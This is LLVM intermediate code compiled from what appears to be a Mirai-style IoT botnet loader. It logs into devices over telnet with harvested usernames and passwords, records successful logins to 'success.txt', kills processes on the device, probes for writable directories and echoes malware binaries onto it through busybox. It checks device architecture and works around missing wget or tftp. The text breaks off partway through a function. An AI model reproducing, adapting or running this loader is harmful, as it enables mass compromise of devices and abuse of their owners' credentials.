; ModuleID = 'host/ir_O3/Sythe.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.connection = type { %union.pthread_mutex_t, %struct.server*, %struct.binary*, %struct.telnet_info, i32, i32, i64, i32, %struct.anon, i16, i16, i8, i8, i8, i8, [8192 x i8] }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%struct.server = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, %struct.server_worker*, %struct.connection**, i32*, i64, i16, i8, i8, i32 }
%struct.server_worker = type { %struct.server*, i32, i64, i8 }
%struct.binary = type { [6 x i8], i32, i8** }
%struct.telnet_info = type { [32 x i8], [32 x i8], [6 x i8], [32 x i8], i32, i16, i32, i8, i8 }
%struct.anon = type { [512 x i8], i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }

@fileeeee = common local_unnamed_addr global %struct._IO_FILE* null, align 8
@stderr = external local_unnamed_addr global %struct._IO_FILE*, align 8
@.str.1 = private unnamed_addr constant [42 x i8] c"Payload Sent --> %d.%d.%d.%d:%d %s:%s %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"success.txt\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"%d.%d.%d.%d:%d %s:%s\0A\00", align 1
@connection_consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@connection_consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"ECCHI: applet not found\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"init\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"[init]\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c"/bin/busybox kill -9 %d\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"rw\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"\5Cx6b\5Cx61\5Cx6d\5Cx69\00", align 1
@.str.16 = private unnamed_addr constant [108 x i8] c"/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [21 x i8] c"/bin/busybox ECCHI\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"kami\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.20 = private unnamed_addr constant [36 x i8] c"rm %s/.t; rm %s/.sh; rm %s/.human\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c"ELF\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"mpsl\00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.30 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.31 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.33 = private unnamed_addr constant [23 x i8] c"wget: applet not found\00", align 1
@.str.34 = private unnamed_addr constant [23 x i8] c"tftp: applet not found\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.37 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.35 = private unnamed_addr constant [44 x i8] c"echo -ne '%s' %s upnp; /bin/busybox ECCHI\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [18 x i8] c"Permission denied\00", align 1
@.str.39 = private unnamed_addr constant [8 x i8] c"timeout\00", align 1
@.str.40 = private unnamed_addr constant [15 x i8] c"illegal option\00", align 1
@.str.41 = private unnamed_addr constant [24 x i8] c"IHCCE: applet not found\00", align 1
@.str.42 = private unnamed_addr constant [15 x i8] c"listening tun0\00", align 1
@str = private unnamed_addr constant [12 x i8] c"srv == NULL\00"

; Function Attrs: noinline nounwind uwtable
define void @connection_open(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 0
  %3 = tail call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %2) #7
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  store i16 0, i16* %4, align 8
  %5 = tail call i64 @time(i64* null) #7
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 6
  store i64 %5, i64* %6, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 10
  store i16 10, i16* %7, align 2
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 5
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 7
  store i32 1, i32* %9, align 8
  %10 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 12
  store i8 0, i8* %10, align 1
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 11
  store i8 1, i8* %11, align 4
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 2
  store %struct.binary* null, %struct.binary** %12, align 8
  store i32 0, i32* %8, align 4
  %13 = tail call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %2) #7
  ret void
}

; Function Attrs: nounwind
declare i32 @pthread_mutex_lock(%union.pthread_mutex_t*) local_unnamed_addr #1

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @pthread_mutex_unlock(%union.pthread_mutex_t*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @connection_close(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 0
  %3 = tail call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %2) #7
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 11
  %5 = load i8, i8* %4, align 4
  %6 = icmp eq i8 %5, 0
  br i1 %6, label %56, label %7

; <label>:7:                                      ; preds = %1
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 8, i32 0, i64 0
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 6
  store i64 0, i64* %9, align 8
  store i8 0, i8* %4, align 4
  %10 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 13
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 1
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 518, i32 4, i1 false)
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 8194, i32 2, i1 false)
  %12 = load %struct.server*, %struct.server** %11, align 8
  %13 = icmp eq %struct.server* %12, null
  br i1 %13, label %14, label %15

; <label>:14:                                     ; preds = %7
  %puts = tail call i32 @puts(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @str, i64 0, i64 0))
  br label %69

; <label>:15:                                     ; preds = %7
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 12
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 0
  br i1 %18, label %53, label %19

; <label>:19:                                     ; preds = %15
  %20 = getelementptr inbounds %struct.server, %struct.server* %12, i64 0, i32 7
  %21 = atomicrmw add i32* %20, i32 1 seq_cst
  %22 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 4
  %24 = load i32, i32* %23, align 8
  %25 = and i32 %24, 255
  %26 = lshr i32 %24, 8
  %27 = and i32 %26, 255
  %28 = lshr i32 %24, 16
  %29 = and i32 %28, 255
  %30 = lshr i32 %24, 24
  %31 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 5
  %32 = load i16, i16* %31, align 4
  %33 = zext i16 %32 to i32
  %34 = tail call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %33) #7
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 0, i64 0
  %36 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 1, i64 0
  %37 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  %38 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %22, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i64 0, i64 0), i32 %25, i32 %27, i32 %29, i32 %30, i32 %34, i8* %35, i8* %36, i8* %37) #8
  %39 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  store %struct._IO_FILE* %39, %struct._IO_FILE** @fileeeee, align 8
  %40 = load i32, i32* %23, align 8
  %41 = and i32 %40, 255
  %42 = lshr i32 %40, 8
  %43 = and i32 %42, 255
  %44 = lshr i32 %40, 16
  %45 = and i32 %44, 255
  %46 = lshr i32 %40, 24
  %47 = load i16, i16* %31, align 4
  %48 = zext i16 %47 to i32
  %49 = tail call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %48) #7
  %50 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %39, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i32 %41, i32 %43, i32 %45, i32 %46, i32 %49, i8* %35, i8* %36)
  %51 = load %struct._IO_FILE*, %struct._IO_FILE** @fileeeee, align 8
  %52 = tail call i32 @fclose(%struct._IO_FILE* %51)
  br label %56

; <label>:53:                                     ; preds = %15
  %54 = getelementptr inbounds %struct.server, %struct.server* %12, i64 0, i32 8
  %55 = atomicrmw add i32* %54, i32 1 seq_cst
  br label %56

; <label>:56:                                     ; preds = %1, %19, %53
  %57 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 7
  store i32 0, i32* %57, align 8
  %58 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %59 = load i32, i32* %58, align 8
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %67, label %61

; <label>:61:                                     ; preds = %56
  %62 = tail call i32 (i32, ...) bitcast (i32 (...)* @close to i32 (i32, ...)*)(i32 %59) #7
  store i32 -1, i32* %58, align 8
  %63 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 1
  %64 = load %struct.server*, %struct.server** %63, align 8
  %65 = getelementptr inbounds %struct.server, %struct.server* %64, i64 0, i32 1
  %66 = atomicrmw sub i32* %65, i32 1 seq_cst
  br label %67

; <label>:67:                                     ; preds = %56, %61
  %68 = tail call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* nonnull %2) #7
  br label %69

; <label>:69:                                     ; preds = %67, %14
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

declare i32 @ntohs(...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fprintf(%struct._IO_FILE* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #1

declare i32 @close(...) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_iacs(%struct.connection*) local_unnamed_addr #0 {
  %2 = alloca [3 x i8], align 1
  %3 = alloca [9 x i8], align 1
  %4 = getelementptr inbounds [3 x i8], [3 x i8]* %2, i64 0, i64 0
  %5 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %6 = load i16, i16* %5, align 8
  %7 = icmp eq i16 %6, 0
  br i1 %7, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %10 = getelementptr inbounds [9 x i8], [9 x i8]* %3, i64 0, i64 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %.backedge
  %.03135 = phi i8* [ %8, %.lr.ph ], [ %.031.be, %.backedge ]
  %.03234 = phi i32 [ 0, %.lr.ph ], [ %.032.be, %.backedge ]
  %12 = load i8, i8* %.03135, align 1
  %13 = icmp eq i8 %12, -1
  br i1 %13, label %14, label %._crit_edge.loopexit

; <label>:14:                                     ; preds = %11
  %15 = call fastcc signext i8 @can_consume(%struct.connection* nonnull %0, i8* nonnull %.03135, i32 1)
  %16 = icmp eq i8 %15, 0
  br i1 %16, label %._crit_edge.loopexit, label %17

; <label>:17:                                     ; preds = %14
  %18 = getelementptr inbounds i8, i8* %.03135, i64 1
  %19 = load i8, i8* %18, align 1
  switch i8 %19, label %40 [
    i8 -1, label %20
    i8 -3, label %26
  ]

; <label>:20:                                     ; preds = %17
  %21 = getelementptr inbounds i8, i8* %.03135, i64 2
  %22 = add nsw i32 %.03234, 2
  br label %.backedge

.backedge:                                        ; preds = %20, %33, %50
  %.032.be = phi i32 [ %22, %20 ], [ %54, %50 ], [ %35, %33 ]
  %.031.be = phi i8* [ %21, %20 ], [ %53, %50 ], [ %34, %33 ]
  %23 = load i16, i16* %5, align 8
  %24 = zext i16 %23 to i32
  %25 = icmp slt i32 %.032.be, %24
  br i1 %25, label %11, label %._crit_edge.loopexit

; <label>:26:                                     ; preds = %17
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @connection_consume_iacs.tmp1, i64 0, i64 0), i64 3, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %10, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @connection_consume_iacs.tmp2, i64 0, i64 0), i64 9, i32 1, i1 false)
  %27 = call fastcc signext i8 @can_consume(%struct.connection* nonnull %0, i8* nonnull %.03135, i32 2)
  %28 = icmp eq i8 %27, 0
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %26
  %30 = getelementptr inbounds i8, i8* %.03135, i64 2
  %31 = load i8, i8* %30, align 1
  %32 = icmp eq i8 %31, 31
  br i1 %32, label %33, label %40

; <label>:33:                                     ; preds = %29
  %34 = getelementptr inbounds i8, i8* %.03135, i64 3
  %35 = add nsw i32 %.03234, 3
  %36 = load i32, i32* %9, align 8
  %37 = call i64 @send(i32 %36, i8* nonnull %4, i64 3, i32 16384) #7
  %38 = load i32, i32* %9, align 8
  %39 = call i64 @send(i32 %38, i8* nonnull %10, i64 9, i32 16384) #7
  br label %.backedge

; <label>:40:                                     ; preds = %17, %29
  %41 = call fastcc signext i8 @can_consume(%struct.connection* %0, i8* nonnull %.03135, i32 2)
  %42 = icmp eq i8 %41, 0
  br i1 %42, label %._crit_edge.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %40
  %43 = load i8, i8* %.03135, align 1
  switch i8 %43, label %.preheader.144 [
    i8 -3, label %44
    i8 -5, label %.sink.split
  ]

; <label>:44:                                     ; preds = %.preheader.preheader
  br label %.sink.split

.sink.split:                                      ; preds = %.preheader.preheader, %44
  %.sink = phi i8 [ -4, %44 ], [ -3, %.preheader.preheader ]
  store i8 %.sink, i8* %.03135, align 1
  br label %.preheader.144

.preheader.144:                                   ; preds = %.preheader.preheader, %.sink.split
  %45 = load i8, i8* %18, align 1
  switch i8 %45, label %.preheader.245 [
    i8 -3, label %46
    i8 -5, label %.sink.split.1
  ]

._crit_edge.loopexit:                             ; preds = %26, %40, %14, %11, %.backedge
  %.032.lcssa.ph = phi i32 [ %.03234, %26 ], [ %.03234, %40 ], [ %.03234, %14 ], [ %.03234, %11 ], [ %.032.be, %.backedge ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.032.lcssa = phi i32 [ 0, %1 ], [ %.032.lcssa.ph, %._crit_edge.loopexit ]
  ret i32 %.032.lcssa

; <label>:46:                                     ; preds = %.preheader.144
  br label %.sink.split.1

.sink.split.1:                                    ; preds = %46, %.preheader.144
  %.sink.1 = phi i8 [ -4, %46 ], [ -3, %.preheader.144 ]
  store i8 %.sink.1, i8* %18, align 1
  br label %.preheader.245

.preheader.245:                                   ; preds = %.sink.split.1, %.preheader.144
  %47 = getelementptr inbounds i8, i8* %.03135, i64 2
  %48 = load i8, i8* %47, align 1
  switch i8 %48, label %50 [
    i8 -3, label %49
    i8 -5, label %.sink.split.2
  ]

; <label>:49:                                     ; preds = %.preheader.245
  br label %.sink.split.2

.sink.split.2:                                    ; preds = %49, %.preheader.245
  %.sink.2 = phi i8 [ -4, %49 ], [ -3, %.preheader.245 ]
  store i8 %.sink.2, i8* %47, align 1
  br label %50

; <label>:50:                                     ; preds = %.sink.split.2, %.preheader.245
  %51 = load i32, i32* %9, align 8
  %52 = call i64 @send(i32 %51, i8* nonnull %.03135, i64 3, i32 16384) #7
  %53 = getelementptr inbounds i8, i8* %.03135, i64 3
  %54 = add nsw i32 %.03234, 3
  br label %.backedge
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc signext i8 @can_consume(%struct.connection* readonly, i8* readnone, i32) unnamed_addr #4 {
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %5 = load i16, i16* %4, align 8
  %6 = zext i16 %5 to i64
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %6
  %8 = sext i32 %2 to i64
  %9 = getelementptr inbounds i8, i8* %1, i64 %8
  %10 = icmp ult i8* %9, %7
  %11 = zext i1 %10 to i8
  ret i8 %11
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_login_prompt(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %3 = load i16, i16* %2, align 8
  %4 = zext i16 %3 to i64
  br label %5

; <label>:5:                                      ; preds = %1, %8
  %indvars.iv = phi i64 [ %4, %1 ], [ %indvars.iv.next, %8 ]
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv
  %7 = load i8, i8* %6, align 1
  switch i8 %7, label %8 [
    i8 58, label %.loopexit.loopexit
    i8 62, label %.loopexit.loopexit
    i8 36, label %.loopexit.loopexit
    i8 35, label %.loopexit.loopexit
    i8 37, label %.loopexit.loopexit
  ]

; <label>:8:                                      ; preds = %5
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %9 = icmp sgt i64 %indvars.iv, 0
  br i1 %9, label %5, label %10

; <label>:10:                                     ; preds = %8
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %12 = zext i16 %3 to i32
  %13 = tail call i32 @util_memsearch(i8* %11, i32 %12, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 4)
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %.loopexit

; <label>:15:                                     ; preds = %10
  %16 = tail call i32 @util_memsearch(i8* %11, i32 %12, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i32 5)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %5, %5, %5, %5, %5
  %17 = trunc i64 %indvars.iv to i32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %15, %10
  %.1 = phi i32 [ %13, %10 ], [ %16, %15 ], [ %17, %.loopexit.loopexit ]
  %18 = icmp eq i32 %.1, -1
  %..1 = select i1 %18, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_password_prompt(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %3 = load i16, i16* %2, align 8
  %4 = zext i16 %3 to i64
  br label %5

; <label>:5:                                      ; preds = %1, %8
  %indvars.iv = phi i64 [ %4, %1 ], [ %indvars.iv.next, %8 ]
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv
  %7 = load i8, i8* %6, align 1
  switch i8 %7, label %8 [
    i8 58, label %.loopexit.loopexit
    i8 62, label %.loopexit.loopexit
    i8 36, label %.loopexit.loopexit
    i8 35, label %.loopexit.loopexit
    i8 37, label %.loopexit.loopexit
  ]

; <label>:8:                                      ; preds = %5
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %9 = icmp sgt i64 %indvars.iv, 0
  br i1 %9, label %5, label %10

; <label>:10:                                     ; preds = %8
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %12 = zext i16 %3 to i32
  %13 = tail call i32 @util_memsearch(i8* %11, i32 %12, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i32 7)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %5, %5, %5, %5, %5
  %14 = trunc i64 %indvars.iv to i32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %10
  %.1 = phi i32 [ %13, %10 ], [ %14, %.loopexit.loopexit ]
  %15 = icmp eq i32 %.1, -1
  %..1 = select i1 %15, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_prompt(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %3 = load i16, i16* %2, align 8
  %4 = zext i16 %3 to i64
  br label %5

; <label>:5:                                      ; preds = %1, %9
  %indvars.iv = phi i64 [ %4, %1 ], [ %indvars.iv.next, %9 ]
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv
  %7 = load i8, i8* %6, align 1
  %8 = trunc i64 %indvars.iv to i32
  switch i8 %7, label %9 [
    i8 58, label %11
    i8 62, label %11
    i8 36, label %11
    i8 35, label %11
    i8 37, label %11
  ]

; <label>:9:                                      ; preds = %5
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %10 = icmp sgt i64 %indvars.iv, 0
  br i1 %10, label %5, label %11

; <label>:11:                                     ; preds = %5, %5, %5, %5, %5, %9
  %.0 = phi i32 [ -1, %9 ], [ %8, %5 ], [ %8, %5 ], [ %8, %5 ], [ %8, %5 ], [ %8, %5 ]
  %12 = icmp eq i32 %.0, -1
  %..0 = select i1 %12, i32 0, i32 %.0
  ret i32 %..0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_verify_login(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  %. = select i1 %7, i32 0, i32 %6
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_psoutput(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  br i1 %7, label %.split.us.preheader, label %.split.preheader

.split.us.preheader:                              ; preds = %1
  %9 = icmp eq i16 %4, 0
  br i1 %9, label %.us-lcssa.us, label %.lr.ph156.preheader

.lr.ph156.preheader:                              ; preds = %.split.us.preheader
  br label %.lr.ph156

.split.preheader:                                 ; preds = %1
  %10 = sext i32 %6 to i64
  %11 = icmp sgt i32 %6, 0
  br i1 %11, label %.lr.ph159.preheader, label %.us-lcssa.us.loopexit134

.lr.ph159.preheader:                              ; preds = %.split.preheader
  br label %.lr.ph159

.lr.ph156:                                        ; preds = %.lr.ph156.preheader, %.split.us
  %.093.us155 = phi i8* [ %.194.us, %.split.us ], [ %2, %.lr.ph156.preheader ]
  %indvars.iv139154 = phi i64 [ %indvars.iv.next140, %.split.us ], [ 0, %.lr.ph156.preheader ]
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv139154
  %13 = load i8, i8* %12, align 1
  switch i8 %13, label %.split.us [
    i8 13, label %63
    i8 10, label %14
  ]

; <label>:14:                                     ; preds = %.lr.ph156
  store i8 0, i8* %12, align 1
  %15 = ptrtoint i8* %12 to i64
  %16 = ptrtoint i8* %.093.us155 to i64
  %17 = sub i64 %15, %16
  %18 = icmp sgt i64 %17, 0
  br i1 %18, label %.lr.ph127.us.preheader, label %.thread.us

.lr.ph127.us.preheader:                           ; preds = %14
  br label %.lr.ph127.us

._crit_edge.us:                                   ; preds = %62
  %19 = icmp ne i8* %.299.us, null
  %20 = icmp ne i8* %.2.us, null
  %or.cond3.us = and i1 %19, %20
  br i1 %or.cond3.us, label %21, label %.thread.us

; <label>:21:                                     ; preds = %._crit_edge.us
  %22 = tail call i32 @atoi(i8* nonnull %.299.us) #9
  %23 = tail call i64 @strlen(i8* nonnull %.2.us) #9
  %24 = trunc i64 %23 to i32
  %25 = icmp eq i32 %22, 1
  br i1 %25, label %.thread.us, label %26

; <label>:26:                                     ; preds = %21
  %27 = tail call i32 @strcmp(i8* nonnull %.2.us, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0)) #9
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %50, label %29

; <label>:29:                                     ; preds = %26
  %30 = tail call i32 @strcmp(i8* nonnull %.2.us, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i64 0, i64 0)) #9
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %50, label %32

; <label>:32:                                     ; preds = %29
  %33 = icmp sgt i32 %22, 400
  %34 = icmp sgt i32 %24, 0
  %or.cond = and i1 %33, %34
  br i1 %or.cond, label %.lr.ph131.us.preheader, label %.thread.us

._crit_edge132.us:                                ; preds = %48
  %35 = icmp sgt i32 %.1.us, 0
  br i1 %35, label %36, label %.thread.us

; <label>:36:                                     ; preds = %._crit_edge132.us
  %37 = load i32, i32* %8, align 8
  %38 = tail call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %37, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0), i32 %22)
  br label %.thread.us

.lr.ph131.us:                                     ; preds = %.lr.ph131.us.preheader, %48
  %indvars.iv137 = phi i64 [ 0, %.lr.ph131.us.preheader ], [ %indvars.iv.next138, %48 ]
  %.091130.us = phi i32 [ 0, %.lr.ph131.us.preheader ], [ %.1.us, %48 ]
  %39 = getelementptr inbounds i8, i8* %.2.us, i64 %indvars.iv137
  %40 = load i8, i8* %39, align 1
  %.off.us = add i8 %40, -48
  %41 = icmp ult i8 %.off.us, 10
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %.lr.ph131.us
  %43 = and i8 %40, -33
  %44 = add i8 %43, -65
  %45 = icmp ult i8 %44, 26
  br i1 %45, label %.thread.us.loopexit, label %48

; <label>:46:                                     ; preds = %.lr.ph131.us
  %47 = add nsw i32 %.091130.us, 1
  br label %48

; <label>:48:                                     ; preds = %46, %42
  %.1.us = phi i32 [ %47, %46 ], [ %.091130.us, %42 ]
  %indvars.iv.next138 = add nuw nsw i64 %indvars.iv137, 1
  %49 = icmp slt i64 %indvars.iv.next138, %66
